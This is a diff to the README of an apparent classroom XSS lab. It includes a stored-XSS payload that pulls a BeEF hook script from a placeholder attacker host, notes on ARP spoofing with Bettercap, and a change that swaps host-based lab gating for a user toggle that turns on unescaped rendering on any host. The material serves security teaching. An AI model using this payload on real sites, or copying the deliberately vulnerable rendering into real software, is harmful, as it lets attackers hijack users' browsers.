@@ -54,15 +54,16 @@ From the project folder, on any machine the target browser can reach:
 python -m http.server 8000
 ```
 
-Open `http://<server>:8000` in the test browser. Must be `localhost` /
-`127.0.0.1` / `file://` for the Q&A board's unescaped rendering to kick
-in; on any other hostname the board escapes posts and no payload will
-execute (see "Lab-mode gating" in Gotchas below).
+Open `http://<server>:8000` in the test browser. **Flip the top-right
+"Safe mode / Demo mode" toggle to Demo mode** before posting a payload —
+in Safe mode the board escapes everything and nothing will execute.
 
 ### 1.2 Inject via a posted question
 
-1. In the portal, scroll to the **Student Q&A Board**.
-2. In the **Ask a question** form, submit a title or body containing a
+1. In the portal, flip the top-right toggle to **Demo mode** (red pill
+   with ⚠). Safe mode is the default and escapes everything.
+2. Scroll to the **Student Q&A Board**.
+3. In the **Ask a question** form, submit a title or body containing a
    payload, for example:
 
    ```html
@@ -75,15 +76,15 @@ execute (see "Lab-mode gating" in Gotchas below).
    <img src=x onerror="var s=document.createElement('script');s.src='http://YOUR_BEEF_HOST:3000/hook.js';document.body.appendChild(s)">
    ```
 
-3. The payload becomes a question on the board. **Any browser that
-   loads the board** now runs the script → appears under **Online
-   Browsers** in the BeEF panel.
+4. The payload becomes a question on the board. **Any browser in
+   Demo mode that loads the board** now runs the script → appears under
+   **Online Browsers** in the BeEF panel.
 
 Why it's a real demo and not a trick: the page's render path is doing
 exactly what a *vulnerable* backend would do — concatenating user
 content into HTML without escaping. The real-world fix is to escape
-before rendering (what this project's public GitHub Pages build does)
-or to use `textContent` instead of `innerHTML`.
+before rendering (what Safe mode does, the default) or to use
+`textContent` instead of `innerHTML`.
 
 ---
 
@@ -179,13 +180,11 @@ module. Starting points:
   `Content-Security-Policy` would block an external `<script src>` even
   if an XSS existed. Bettercap's injection is similarly thwarted if the
   site is HTTPS with HSTS.
-- **Lab-mode gating** (`portal.js`) treats any non-routable host as a
-  lab: `localhost`, `127.x`, `file://`, `*.local` / `*.lan` /
-  `*.internal`, and RFC1918 LAN addresses (`10.x`, `172.16–31.x`,
-  `192.168.x`). That covers the normal case where the victim VM
-  reaches the attacker's server by LAN IP (`http://<attacker-IP>:8000`).
-  On GitHub Pages or any other public hostname the board escapes
-  everything and the stored-XSS vector is inert.
+- **Demo-mode toggle** (top-right corner on every page). Must be
+  flipped to **Demo mode** for a posted payload to execute. Safe by
+  default; the state persists per browser in `localStorage`. Flip it
+  back to Safe mode after the demo so later visitors don't inherit the
+  vulnerable rendering in their session.
 - **Bettercap scope**: ARP spoofing an unauthorized network is illegal
   in most jurisdictions. Only run it on networks you own or on an
   isolated lab segment set up for the class.
